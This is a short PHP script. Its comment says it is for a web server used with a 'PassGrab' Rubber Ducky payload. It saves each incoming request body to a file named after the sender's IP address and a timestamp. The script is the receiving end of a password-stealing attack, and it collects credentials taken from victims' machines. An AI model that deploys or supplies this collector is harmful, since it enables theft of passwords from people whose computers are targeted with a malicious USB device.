# Use on your web server with the PassGrab Ducky script.

<?php
$file = $_SERVER['REMOTE_ADDR'] . "_" . date("Y-m-d_H-i-s") . ".secret";
file_put_contents($file, file_get_contents("php://input"));
?>
